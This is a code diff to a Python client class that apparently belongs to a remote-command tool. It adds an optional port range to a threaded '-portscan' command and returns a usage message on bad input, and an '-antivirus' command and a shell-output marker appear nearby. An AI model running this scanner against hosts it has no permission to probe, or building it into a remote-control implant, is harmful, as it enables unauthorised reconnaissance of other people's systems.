@@ -790,17 +790,20 @@ class Client:
                         pass
 
                 def main(self):
-                    for port_num in range(0, 65535):
-                        t = Thread(target=self.checking_port, args=(ip, port_num))
-                        t.start()
-                    return self.open_ports
+                    try:
+                        port_range = [0, 65536] if len(command.split()) == 1 else command.split()[1].split(':')
+                        for port_num in range(int(port_range[0]), int(port_range[1])):
+                            t = Thread(target=self.checking_port, args=(ip, port_num))
+                            t.start()
+                        return self.open_ports
+                    except:
+                        return 'Try again, use this syntax:\n\n-portscan int:int or -portscan'
 
             start = port_scan()
             a = start.main()
-            full = f'[@%HOST_SHELL%@]Open ports:\n\n'
+            full = f'[@%HOST_SHELL%@]Open ports:\n\n' if not 'Try again' in a else f'[@%HOST_SHELL%@]' 
             for x in a:
                 full += x
-
             return full
             
         elif '-antivirus' in command:
